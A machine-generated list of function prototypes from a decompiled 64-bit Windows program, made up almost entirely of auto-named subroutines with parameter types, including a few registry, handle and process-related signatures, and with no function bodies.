signed __int64 __fastcall sub_14001C6C0(__int64 a1);
signed __int64 __fastcall sub_14001C724(__int64 a1);
signed __int64 __fastcall sub_14001C730(__int64 a1);
signed __int64 __fastcall sub_14001C794(__int64 a1);
signed __int64 __fastcall sub_14001C7A0(__int64 a1);
HANDLE __fastcall sub_14001C810(LONG lInitialCount, LONG lMaximumCount);
HANDLE __fastcall sub_14001C8D0(HANDLE hSourceHandle);
signed __int64 __fastcall sub_14001C9D0(unsigned __int16 a1, unsigned __int16 a2);
__int64 __fastcall sub_14001CA50(__int64 **a1, _DWORD *a2);
__int64 *__fastcall sub_14001CBD0(__int64 **a1, __int64 *a2, __int64 a3);
_QWORD *__fastcall sub_14001CFC0(volatile signed __int32 *a1, __int64 a2);
void __fastcall sub_14001D190(void *a1);
__int64 __fastcall sub_14001D1F0(__int64 *a1);
void __fastcall sub_14001D2E0(volatile signed __int32 **a1);
void __fastcall sub_14001D400(volatile signed __int32 *a1);
void __fastcall sub_14001D4E0(_QWORD *a1, __int64 a2, __int64 a3);
void __fastcall __noreturn sub_14001D590(__int64 a1);
void __fastcall __noreturn sub_14001D5A0(__int64 a1);
void __fastcall __noreturn sub_14001D688(__int64 a1);
void __fastcall __noreturn sub_14001D6A0(__int64 a1);
void __fastcall __noreturn sub_14001D788(__int64 a1);
void __fastcall __noreturn sub_14001D7A0(__int64 a1);
void __fastcall __noreturn sub_14001D888(__int64 a1);
void __fastcall __noreturn sub_14001D8A0(__int64 a1);
void __fastcall __noreturn sub_14001D988(__int64 a1);
void __fastcall __noreturn sub_14001D9A0(__int64 a1);
__int64 __fastcall sub_14001DAD0(__int64 a1);
char __fastcall sub_14001DAE0(void **a1);
signed int __fastcall sub_14001DB90(volatile signed __int32 **a1);
char __fastcall sub_14001DCE0(HKEY a1, const CHAR *a2, char a3);
bool __fastcall sub_14001DD60(HKEY a1, const CHAR *a2, const CHAR *a3, char a4);
char __fastcall sub_14001DE10(HKEY a1, const CHAR *a2, char a3);
_QWORD *__fastcall sub_14001DE70(_QWORD *a1, size_t *a2, size_t *a3);
_DWORD *__fastcall sub_14001DEF0(void *Src);
_QWORD *__fastcall sub_14001E090(void *Dst, _QWORD *a2);
_QWORD *__fastcall sub_14001E200(_QWORD *a1, _QWORD *a2);
void sub_14001E2C0();
size_t *__fastcall sub_14001E3C0(size_t *a1, size_t a2, size_t *a3, unsigned __int64 a4, size_t a5);
bool __fastcall sub_14001E540(LPCSTR lpApplicationName, char *Src);
// __int64 __fastcall sub_14001E6B0(_QWORD, _QWORD); weak
void __fastcall sub_14001E790(__int64 a1);
bool __fastcall sub_14001E800(LPCSTR lpName);
bool __fastcall sub_14001E8C0(const CHAR *a1);
bool __fastcall sub_14001E900(const CHAR *a1);
// __int64 __fastcall sub_14001E930(_QWORD, _QWORD); weak
_QWORD *__fastcall sub_14001EA10(_QWORD *a1, __int64 a2, _QWORD **a3);
__int64 __fastcall sub_14001EA90(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_14001EAE0(_QWORD *a1, _QWORD *a2);
__int64 __fastcall sub_14001EBA0(__int64 a1, __int64 a2, unsigned __int64 *a3, __int64 **a4);
__int64 *__fastcall sub_14001EDA0(__int64 a1, __int64 *a2, char a3, __int64 *a4, __int64 a5, __int64 a6);
_QWORD *__fastcall sub_14001F050(_QWORD *a1, _QWORD *a2, char a3, _QWORD *a4, _QWORD *a5);
__int64 *__fastcall sub_14001F320(__int64 a1, __int64 *a2, __int64 *a3, const void **a4, __int64 a5);
__int64 __fastcall sub_14001F600(_QWORD **a1, __int64 a2, char a3, const void **a4, __int64 a5);
__int64 __fastcall sub_14001F870(_QWORD **a1, __int64 a2, char a3, const void **a4);
__int64 __fastcall sub_14001FAD0(__int64 *a1, __int64 a2, __int64 *a3);
_QWORD *__fastcall sub_14001FB00(unsigned __int64 a1, unsigned __int64 a2, _QWORD *a3);
_QWORD *__fastcall sub_14001FB50(_QWORD *a1, _QWORD *a2, __int64 a3);
_QWORD *__fastcall sub_14001FC00(_QWORD *a1);
// __int64 __fastcall Concurrency::target_block<Concurrency::multi_link_registry<Concurrency::ISource<unsigned __int64>>,Concurrency::ordered_message_processor<unsigned __int64>>::target_block<Concurrency::multi_link_registry<Concurrency::ISource<unsigned __int64>>,Concurrency::ordered_message_processor<unsigned __int64>>(_QWORD, _QWORD); weak
void __fastcall sub_14001FD70(void **a1);
void __fastcall sub_14001FDE0(__int64 a1);
// __int64 __fastcall sub_14001FE80(_QWORD); weak
void __fastcall sub_14001FF20(__int64 a1);
void __fastcall sub_14001FF60(__int64 a1);
__int64 (__fastcall **__fastcall sub_14001FFD0(__int64 a1))();
__int64 __fastcall sub_1400200D0(__int64 *a1, __int64 a2);
void *__fastcall sub_140020168(__int64 a1, char a2);
void *__fastcall sub_140020180(void *a1, char a2);
_QWORD *__fastcall sub_1400201B0(_QWORD *a1, char a2);
void __fastcall sub_1400201E0(__int64 a1, _QWORD *a2);
void __fastcall sub_1400203B0(__int64 a1);
_QWORD *__fastcall sub_140020470(__int64 a1, _QWORD *a2, const void **a3);
void __fastcall sub_140020540(__int64 a1);
void __fastcall sub_1400205F0(__int64 a1, __int64 *a2, _QWORD *a3, _QWORD *a4);
void __fastcall sub_1400207C0(__int64 a1, _BYTE *a2, _BYTE *a3);
void __fastcall sub_140020960(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4);
// __int64 __fastcall sub_1400209A0(char); weak
void __fastcall sub_140020B60(__int64 a1, _BYTE *a2);
void __fastcall sub_140020CE0(__int64 a1, _BYTE *a2, _BYTE *a3);
void __fastcall sub_140020F80(__int64 a1, _BYTE *a2);
void __fastcall sub_140021220(__int64 a1, char a2);
__int64 __fastcall sub_140021230(__int64 a1, _QWORD *a2);
void sub_140021580();
void sub_1400215D0();
// __int64 __fastcall sub_140021620(_QWORD, _QWORD, _QWORD); weak
_QWORD *__fastcall sub_140021680(_QWORD *a1);
_QWORD *__fastcall sub_1400216E0(_QWORD *a1);
__int64 *__fastcall sub_140021740(__int64 **a1);
void __fastcall sub_140021830(__int64 a1, _QWORD **a2);
void __fastcall sub_140021870(__int64 a1, __int64 a2);
void __fastcall sub_1400218E0(__int64 a1, __int64 **a2);
_QWORD *__fastcall sub_140021980(unsigned __int64 *a1, _QWORD *a2, unsigned __int64 a3, unsigned __int64 a4, __int64 *a5);
__int64 *__fastcall sub_140021CD0(__int64 *a1, __int64 a2);
_QWORD *__fastcall sub_140021D80(__int64 *a1, _QWORD *a2, size_t *a3);
__int64 *__fastcall sub_140021F60(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_140022060(_QWORD *a1, _QWORD *a2, __int64 a3);
_QWORD *__fastcall sub_140022470(_QWORD *a1, _QWORD *a2, const void **a3);
_QWORD *__fastcall sub_140022630(_QWORD *a1, _QWORD *a2, __int64 a3);
__int64 (__fastcall **__fastcall sub_140022690(_QWORD *a1))();
void *__fastcall sub_140022728(__int64 a1, char a2);
void *__fastcall sub_140022740(void *a1, char a2);
__int64 __fastcall sub_140022770(__int64 a1);
__int64 __fastcall sub_140022780(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400227B0(__int64 a1);
__int64 __fastcall sub_1400227C0(__int64 a1);
__int64 __fastcall sub_1400227D0(__int64 a1);
__int64 __fastcall sub_1400227E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140022830(__int64 a1);
// __int64 __fastcall sub_140022840(_QWORD, _QWORD); weak
__int64 __fastcall sub_140022A10(__int64 a1, __int64 a2, _DWORD *a3, char a4);
__int64 __fastcall sub_140022AD0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140022BD0(__int64 a1, __int64 a2, _DWORD *a3, char a4);
__int64 __fastcall sub_140022C60(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140022CB0(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_140022D20(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140022D80(__int64 a1, __int64 a2);
__int64 __fastcall sub_140022DC0(__int64 a1, int a2);
__int64 __fastcall sub_140022E80(__int64 a1, const void *a2, unsigned __int64 a3);
__int64 __fastcall sub_140022F10(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_140022F60(__int64 a1, __int64 a2);
__int64 __fastcall sub_140022FE0(__int64 a1, char a2);
__int64 __fastcall sub_140023050(__int64 a1, __int64 a2, const char *a3, __int64 a4, _QWORD *a5, __int64 a6);
// __int64 __fastcall sub_1400232F0(_QWORD, _QWORD, _QWORD); weak
_QWORD *__fastcall sub_1400233A0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_140023410(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_140023480(_QWORD *a1, __int64 a2);
std::exception *__fastcall sub_1400234F0(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_140023560(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_1400235E0(std::exception *a1, _QWORD *a2);
std::exception *__fastcall sub_140023660(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_1400236E0(std::exception *a1, _QWORD *a2);
std::exception *__fastcall sub_140023760(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_1400237E0(std::exception *a1, const struct std::exception *a2);
__int64 __fastcall sub_140023820(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140023920(__int64 a1, __int64 a2);
std::exception *__fastcall sub_1400239A0(std::exception *a1, const struct std::exception *a2);
_DWORD *__fastcall sub_140023A20(_DWORD *a1);
std::exception *__fastcall sub_140023AF0(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_140023B70(std::exception *a1);
void __fastcall sub_140023BE0(__int64 a1);
__int64 __fastcall sub_140023C40(__int64 a1);
__int64 __fastcall sub_140023C70(__int64 a1);
void __fastcall sub_140023CA0(__int64 a1);
__int64 __fastcall sub_140023CD0(__int64 a1);
void __fastcall sub_140023D40(__int64 a1);
__int64 __fastcall sub_140023DE0(volatile signed __int32 ***a1);
__int64 __fastcall sub_140023E20(__int64 a1);
// __int64 sub_140023E90(void); weak
__int64 (__fastcall **__fastcall sub_140023F90(__int64 a1))();
__int64 __fastcall sub_140023FE0(__int64 a1);
void __fastcall sub_140024000(__int64 a1);
void __fastcall sub_140024080(__int64 a1);
signed __int64 __fastcall sub_1400240F0(__int64 a1);
__int64 (__fastcall **__fastcall sub_140024160(__int64 a1))();
char __fastcall sub_140024220(_QWORD *a1);
void __fastcall sub_1400242B0(void *a1);
void __fastcall sub_1400242E0(__int64 a1);
__int64 __fastcall sub_140024310(__int64 **a1);
__int64 __fastcall sub_140024360(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_1400243F0(_QWORD *a1, __int64 *a2);
__int64 *__fastcall sub_140024470(__int64 *a1, __int64 *a2);
__int64 __fastcall sub_140024640(__int64 a1, __int64 a2, unsigned __int64 a3);
bool __fastcall sub_1400246C0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400246E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140024710(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140024740(__int64 a1, __int64 a2);
__int64 __fastcall sub_140024770(__int64 a1, __int64 a2, __int64 a3);
void *__fastcall sub_1400247A0(void *a1, __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_1400247D0(__int64 a1, __int64 a2);
void __fastcall sub_140024800(__int64 a1);
void __fastcall sub_140024880(__int64 a1);
void *__fastcall sub_1400248DC(__int64 a1, char a2);
void *__fastcall sub_1400248F0(__int64 a1, char a2);
void *__fastcall sub_1400248FC(__int64 a1, char a2);
void *__fastcall sub_140024910(__int64 a1, char a2);
void *__fastcall sub_140024930(void *a1, char a2);
void *__fastcall sub_1400249C0(void *a1, char a2);
_QWORD *__fastcall sub_140024A40(_QWORD *a1, char a2);
void *__fastcall sub_140024A70(void *a1, char a2);
void *__fastcall sub_140024AA0(__int64 a1, char a2);
void *__fastcall sub_140024AE0(void *a1, char a2);
void *__fastcall sub_140024B10(void *a1, char a2);
void *__fastcall sub_140024B90(void *a1, char a2);
void *__fastcall sub_140024BC0(void *a1, char a2);
void *__fastcall sub_140024BF0(void *a1, char a2);
void *__fastcall sub_140024C20(void *a1, char a2);
void *__fastcall sub_140024CA0(void *a1, char a2);
signed __int64 __fastcall sub_140024D20(__int64 a1);
__int64 __fastcall sub_140024D30(__int64 a1);
__int64 __fastcall sub_140024D40(__int64 a1);
__int64 __fastcall sub_140024D70(__int64 a1, __int64 a2);
__int64 __fastcall sub_140024DA0(__int64 a1);
char __fastcall sub_140024DB0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned __int8 a5);
__int64 __fastcall sub_140024F00(__int64 a1, __int64 a2, __int64 a3, __int64 *a4, __int64 a5);
__int64 __fastcall sub_140025190(__int64 a1);
_QWORD *__fastcall sub_1400251B0(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_1400251E0(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_14002521C(__int64 a1, __int64 a2);
__int64 __fastcall sub_140025230(__int64 a1, __int64 a2);
signed __int64 *__fastcall sub_140025284(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400252A0(__int64 a1, void *a2, __int64 a3, _DWORD *a4);
__int64 __fastcall sub_140025330(__int64 a1);
_QWORD *__fastcall sub_1400254E0(__int64 a1, _QWORD *a2, __int64 a3);
__int64 __fastcall sub_140025510(__int64 a1);
__int64 __fastcall sub_140025520(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6);
__int64 __fastcall sub_140025560(__int64 a1, __int64 a2, __int64 a3);
void __fastcall sub_1400255A0(unsigned __int64 a1);
signed __int64 __fastcall sub_140025670(unsigned __int64 a1);
_QWORD *__fastcall sub_140025760(__int64 a1);
_QWORD *__fastcall sub_1400257A0(__int64 a1);
void __noreturn sub_1400257E0();
__int64 __fastcall sub_1400258A0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140025930(__int64 a1, __int64 a2);
__int64 __fastcall sub_140025960(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140025990(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140025A10(__int64 a1, __int64 a2);
__int64 __fastcall sub_140025A40(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140025A70(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140025A80(__int64 a1);
__int64 __fastcall sub_140025AC0(__int64 *a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140025B00(__int64 a1, __int64 a2);
__int64 __fastcall sub_140025B10(__int64 a1);
__int64 __fastcall sub_140025B20(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
bool __fastcall sub_140025B60(__int64 a1, __int64 a2, __int64 a3);
_QWORD *__fastcall sub_140025D40(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);
_QWORD *__fastcall sub_140026420(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_140026B10(__int64 a1, __int64 a2, __int64 a3);
void *__fastcall sub_140026B80(__int64 a1, void *a2, __int64 a3, __int64 a4);
_BOOL8 __fastcall sub_140026C00(__int64 a1);
void __fastcall sub_140026CA0(__int64 a1, __int64 a2, __int64 a3);
void __fastcall sub_140026DA0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
void __fastcall sub_140027080(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
signed __int64 __fastcall sub_140027150(__int64 a1, unsigned __int8 (__fastcall ***a2)(_QWORD));
signed __int64 __fastcall sub_140027180(__int64 a1);
__int64 __fastcall sub_140027190(__int64 a1, __int64 a2);
__int64 __fastcall sub_140027220(__int64 a1);
__int64 __fastcall sub_140027230(__int64 a1, int a2);
__int64 __fastcall sub_140027240(__int64 a1);
_QWORD *__fastcall sub_140027260(void *Src);
_QWORD *__fastcall sub_140027560(void *Src);
_QWORD *__fastcall sub_140027740(void *Src);
__int64 __fastcall sub_140027920(__int64 a1);
signed __int64 __fastcall sub_140027A40(__int64 a1);
__int64 sub_140027A50();
__int64 __fastcall sub_140027A60(__int64 a1);
signed __int64 __fastcall sub_140027A90(__int64 a1);
_QWORD *__fastcall sub_140027AA0(void *Src);
__int64 __fastcall sub_140027CA0(__int64 a1);
__int64 __fastcall sub_140027CC0(__int64 a1);
_QWORD *__fastcall sub_140027D10(void *Src);
char __fastcall sub_14002803C(__int64 a1, const char *a2, __int64 a3, _QWORD *a4);
__int64 __fastcall sub_140028050(__int64 a1, const char *a2, __int64 a3, _QWORD *a4);
__int64 __fastcall sub_140028060(__int64 a1, const char *a2, __int64 a3, _QWORD *a4);
__int64 __fastcall sub_1400280B0(__int64 a1);
__int64 __fastcall sub_1400280C0(__int64 a1, __int64 a2);
// __int64 __fastcall sub_140028110(_QWORD, _QWORD, _QWORD); weak
bool __fastcall sub_1400281C0(_QWORD *a1, __int64 *a2);
_QWORD *__fastcall sub_1400282B0(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_140028400(__int64 a1);
bool __fastcall sub_140028410(__int64 a1, __int64 a2);
bool __fastcall sub_140028440(__int64 a1);
char sub_140028450();
__int64 sub_140028460();
_QWORD *__fastcall sub_1400284C0(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140028550(__int64 a1);
bool __fastcall sub_140028580(__int64 a1, __int64 a2);
__int64 __fastcall sub_140028698(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400286B0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140028720(__int64 a1, __int64 a2);
signed __int64 __fastcall sub_140028770(__int64 a1);
__int64 __fastcall sub_140028790(__int64 a1);
__int64 __fastcall sub_140028830(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400288A0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140028934(__int64 a1, unsigned int a2);
__int64 __fastcall sub_140028950(__int64 a1, unsigned int a2);
__int64 __fastcall sub_1400289D0(__int64 a1);
__int64 __fastcall sub_1400289F0(__int64 a1);
char __fastcall sub_140028A10(__int64 a1, _BYTE *a2, _BYTE *a3);
__int64 __fastcall sub_140028CC0(__int64 a1, __int64 a2);
// __int64 __fastcall sub_140028CF0(_QWORD); weak
__int64 __fastcall sub_140028D74(__int64 a1);
__int64 __fastcall sub_140028D9C(__int64 a1, __int64 a2);
__int64 __fastcall sub_140028DB0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140028E10(__int64 a1, __int64 a2);
__int64 __fastcall sub_140028E40(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140028EE0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140028F40(__int64 a1, __int64 a2);
__int64 __fastcall sub_140028F70(__int64 a1);
__int64 __fastcall sub_140028F80(__int64 a1, __int64 a2);
__int64 __fastcall sub_140029020(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_140029050(_QWORD *a1);
_QWORD *__fastcall sub_1400290C0(_QWORD *a1);
void *__fastcall sub_140029100(__int64 a1, void *a2, __int64 a3);
__int64 __fastcall sub_140029280(__int64 a1);
char __fastcall sub_140029290(__int64 a1);
__int64 __fastcall sub_1400292B0(__int64 a1);
__int64 __fastcall sub_1400293A0(void *Src, __int64 a2, __int64 a3);
char __fastcall sub_1400294B4(__int64 a1, __int64 a2, unsigned int a3);
char __fastcall sub_1400294D0(__int64 a1, __int64 a2, unsigned int a3);
char __fastcall sub_140029590(_QWORD *a1, unsigned __int64 a2);
void __fastcall sub_140029610(__int64 a1);
signed __int64 __fastcall sub_140029680(__int64 a1, volatile signed __int32 **a2, volatile signed __int32 **a3);
__int64 __fastcall sub_1400296F0(__int64 a1, __int64 (__fastcall ***a2)(_QWORD, _QWORD), __int64 (__fastcall ***a3)(_QWORD, _QWORD));
void __fastcall sub_140029730(__int64 a1, const void *a2, unsigned __int64 a3, int a4);
__int64 __fastcall sub_140029830(_QWORD *a1, __int64 a2, __int64 a3);
void __fastcall sub_1400298B0(void ***a1);
__int64 __fastcall sub_140029930(__int64 *a1);
signed __int64 __fastcall sub_140029990(__int64 a1, unsigned int a2);
signed __int64 __fastcall sub_140029BF0(__int64 a1, unsigned int a2);
__int64 __fastcall sub_140029C40(__int64 a1, __int64 a2, __int64 a3, int a4, char a5);
__int64 __fastcall sub_140029DD0(__int64 a1, __int64 a2, _QWORD *a3, char a4);
_QWORD *__fastcall sub_140029EE0(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_14002A070(__int64 a1, _QWORD *a2);
signed __int64 __fastcall sub_14002A0A0(__int64 a1);
_QWORD *__fastcall sub_14002A100(__int64 a1);
_QWORD *__fastcall sub_14002A110(_QWORD *a1, _QWORD *a2, _QWORD *a3);
__int64 (__fastcall **__fastcall sub_14002A1C0(__int64 a1))();
void *__fastcall sub_14002A250(void *a1, char a2);
_QWORD *__fastcall sub_14002A280(__int64 a1);
char __fastcall sub_14002A290(_QWORD *a1, _BYTE *a2, _BYTE *a3);
_QWORD *__fastcall sub_14002A450(_QWORD *a1, __int64 a2);
void __fastcall sub_14002A4C0(void *a1);
char *__fastcall sub_14002A530(__int64 a1);
char **__fastcall sub_14002A5F0(char **a1, __int64 a2);
__int64 __fastcall sub_14002A620(__int64 *a1, __int64 a2);
_QWORD *__fastcall sub_14002A700(_QWORD *a1, _QWORD *a2);
__int64 (__fastcall **__fastcall sub_14002A740(_QWORD *a1))();
__int64 __fastcall sub_14002A7E8(__int64 a1);
void *__fastcall sub_14002A7F0(void *a1, char a2);
void __fastcall sub_14002A820(__int64 a1);
_BOOL8 __fastcall sub_14002A830(__int64 a1, unsigned int a2);
_QWORD *__fastcall sub_14002A900(void *Src);
_QWORD *__fastcall sub_14002AB10(void *Src);
char *sub_14002AD60();
void *sub_14002AE90();
void __fastcall sub_14002AEA0(__int64 a1, __int64 a2);
char __fastcall sub_14002AEB0(__int64 a1, __int64 a2, _BYTE *a3);
__int64 __fastcall sub_14002B230(__int64 a1, _QWORD *a2);
void __fastcall sub_14002B480(__int64 a1);
__int64 __fastcall sub_14002B490(__int64 *a1, __int64 a2);
__int64 __fastcall sub_14002B590(__int64 a1);
__int64 __fastcall sub_14002B5B0(__int64 a1);
__int64 (__fastcall **__fastcall sub_14002B5E0(_QWORD *a1))();
void *__fastcall sub_14002B660(void *a1, char a2);
FARPROC __fastcall sub_14002B690(__int64 a1, const CHAR *a2);
_BOOL8 __fastcall sub_14002B6E0(__int64 a1, _QWORD *a2);
bool __fastcall sub_14002B790(__int64 a1);
__int64 __fastcall sub_14002B7D0(__int64 a1, __int64 a2, int a3, int a4);
signed __int64 __fastcall sub_14002B800(__int64 a1);
size_t *__fastcall sub_14002B950(size_t *a1, _QWORD *a2, _QWORD *a3);
void __fastcall sub_14002BA10(HKEY hKey, _QWORD *a2, _QWORD *a3, char a4);
_QWORD *__fastcall sub_14002BC40(_QWORD *a1, __int64 a2);
void **__fastcall sub_14002BCB0(void *a1, char a2);
char *sub_14002BD10();
char *sub_14002BE70();
_QWORD *__fastcall sub_14002BFC0(__int64 a1, _QWORD *a2);
char __fastcall sub_14002C0D0(__int64 a1, __int64 a2);
// __int64 __fastcall sub_14002C1B0(_QWORD, _QWORD, _QWORD); weak
_QWORD *__fastcall sub_14002C210(_QWORD *a1, __int64 a2);
// __int64 __fastcall sub_14002C240(_QWORD); weak
_QWORD *__fastcall sub_14002C280(_QWORD *a1, __int64 a2, __int64 a3, int a4);
_QWORD *__fastcall sub_14002C340(_QWORD *a1, __int64 a2, int a3);
_QWORD *__fastcall sub_14002C400(_QWORD *a1, __int64 a2, int a3);
// __int64 __cdecl sub_14002C490(_QWORD); weak
_QWORD *__fastcall sub_14002C520(_QWORD *a1, __int64 a2, _QWORD *a3, _QWORD *a4, __int64 a5);
__int64 __fastcall sub_14002C5F0(std::exception *a1);
void __fastcall sub_14002C680(__int64 a1);
void **__fastcall sub_14002C710(std::exception *a1);
_QWORD *__fastcall sub_14002C730(__int64 a1, char a2);
_QWORD *__fastcall sub_14002C740(__int64 a1, char a2);
_QWORD *__fastcall sub_14002C750(void *a1, char a2);
void *__fastcall sub_14002C790(void *a1, char a2);
__int64 __fastcall sub_14002C7C0(_QWORD *a1);
// __int64 __fastcall sub_14002C840(_QWORD, _QWORD); weak
void __fastcall sub_14002C900(__int64 a1);
signed __int64 __fastcall sub_14002CAC8(__int64 a1);
signed __int64 __fastcall sub_14002CAE0(__int64 a1);
signed __int64 *__fastcall sub_14002CB50(signed __int64 *a1, unsigned __int16 *a2);
void __fastcall __noreturn sub_14002CCFC(__int64 a1);
void __fastcall __noreturn sub_14002CD10(__int64 a1);
__int64 *__fastcall sub_14002CE00(__int64 *a1, __int64 *a2, __int64 *a3);
signed __int64 __fastcall sub_14002CF80(int a1, int a2, int a3, __int64 a4);
void __fastcall sub_14002D000(char a1);
_QWORD *__fastcall sub_14002D010(_QWORD *a1, char *a2, __int64 *a3);
__int64 *__fastcall sub_14002D080(__int64 *a1, __int64 a2, __int64 a3, char *a4, char *a5);
_QWORD *__fastcall sub_14002D170(void *Src, void *a2);
// __int64 __fastcall sub_14002D1F0(_QWORD, _QWORD); weak
__int64 __fastcall sub_14002D3D0(__int64 a1);
__int64 __fastcall sub_14002D400(_WORD *a1);
_QWORD *__fastcall sub_14002D4E0(void *Src);
_QWORD *__fastcall sub_14002D620(void *Src);
_QWORD *__fastcall sub_14002D740(void *Src);
_DWORD *__fastcall sub_14002D940(void *Src);
__int64 *__fastcall sub_14002DAE0(__int64 *a1);
_QWORD *__fastcall sub_14002DC40(void *Src);
_QWORD *__fastcall sub_14002DE10(void *Src);
__int64 __fastcall sub_14002DF30(_QWORD *a1, _OWORD *a2);
_QWORD *__fastcall sub_14002E160(void *Src);
signed __int64 __fastcall sub_14002E3B0(_QWORD *a1);
__int64 __fastcall sub_14002E430(__int64 a1);
__int64 __fastcall sub_14002E450(_QWORD *a1, _QWORD *a2);
_QWORD *__fastcall sub_14002E4C0(void *Src, _QWORD *a2, unsigned __int64 a3, unsigned __int64 a4);
__int64 *__fastcall sub_14002E600(void *Src, void *a2, unsigned __int64 a3);
__int64 *__fastcall sub_14002E750(__int64 *a1, unsigned __int64 a2, __int64 *a3, unsigned __int64 a4, unsigned __int64 a5);
__int64 *__fastcall sub_14002E8D0(__int64 *a1, unsigned __int64 a2, char *a3, unsigned __int64 a4);
__int64 *__fastcall sub_14002EA40(__int64 *a1, unsigned __int64 a2, unsigned __int64 a3, __int64 *a4, unsigned __int64 a5, unsigned __int64 a6);
_QWORD *__fastcall sub_14002EDD0(_QWORD *a1, __int64 a2);
void __fastcall sub_14002EE40(void *a1);
__int64 __fastcall sub_14002EEA0(__int64 *a1, __int64 a2);
// __int64 __fastcall sub_14002EF80(_QWORD); weak
void __fastcall sub_14002F160(_BYTE *a1);
__int64 __fastcall sub_14002F170(unsigned __int8 *a1);
char *sub_14002F180();
_QWORD *__fastcall sub_14002F460(_QWORD *a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, __int64 a5);
void __fastcall sub_14002F540(__int64 a1);
void __fastcall sub_14002F550(__int64 a1);
void __fastcall sub_14002F560(__int64 a1);
_QWORD *__fastcall sub_14002F570(void *Src);
_QWORD *__fastcall sub_14002F8D0(void *Src);
void __fastcall sub_14002FAE0(__int64 a1, int a2);
__int64 __fastcall sub_140030190(__int64 a1, __int64 a2, signed int a3);
bool __fastcall sub_1400307A0(__int64 a1, __int64 a2, int a3);
// __int64 __fastcall sub_1400307C0(_QWORD, _QWORD); weak
_QWORD *__fastcall sub_1400309C0(__int64 a1, __int64 a2, DWORD a3);
const char *sub_140030BE0();
const char *sub_140030BF0();
// __int64 __cdecl sub_140030C00(_QWORD); weak
void __fastcall sub_140030C60(void *Src, char *a2, _QWORD *a3, __int64 a4);
void __fastcall sub_140030D50(void *Src, char *a2, _QWORD *a3, __int64 a4);
_QWORD *__fastcall sub_140030E40(void *Src, __int64 a2, char *a3, __int64 a4, _QWORD *Srca, __int64 a6);
_QWORD *__fastcall sub_140030F80(void *Src, __int64 a2, char *a3, __int64 a4, _QWORD *Srca, __int64 a6);
// _QWORD *__usercall sub_1400310C0@<rax>(void *Src@<rcx>, __int64 a2@<rdx>, __int64 a3@<r8>, char *a4@<r9>, __int64 a5);
// __int64 *__usercall sub_140031150@<rax>(void *Src@<rcx>, unsigned __int64 a2@<rdx>, unsigned __int64 a3@<r8>, char *a4@<r9>, __int64 a5);
_QWORD *__fastcall sub_140031390(void *Src, _BYTE *a2, _BYTE *a3);
bool __fastcall sub_140031490(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400314C0(__int64 *a1);
__int64 *__fastcall sub_1400315D0(__int64 *a1, __int16 a2);
_QWORD *__fastcall sub_140031640(void *Src, _QWORD *a2);
_QWORD *__fastcall sub_1400317F0(_QWORD *a1, char a2);
unsigned __int64 *__fastcall sub_140031840(_QWORD *a1, __int64 a2);
// __int64 __cdecl sub_140031970(_QWORD, _QWORD); weak
signed __int64 __fastcall sub_1400319C0(_QWORD *a1, unsigned __int64 a2, unsigned __int64 a3, _WORD *a4, unsigned __int64 a5);
// __int64 __cdecl sub_140031B70(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __cdecl sub_140031BF0(_QWORD, _QWORD); weak
__int64 __fastcall sub_140031C70(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_140031CA0(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_140031F10(__int64 a1, _QWORD *a2);
signed __int64 __fastcall sub_1400320C0(char *a1, unsigned __int64 a2);
signed __int64 __fastcall sub_1400321D0(char *a1, _WORD *a2, unsigned __int64 a3, __int64 a4);
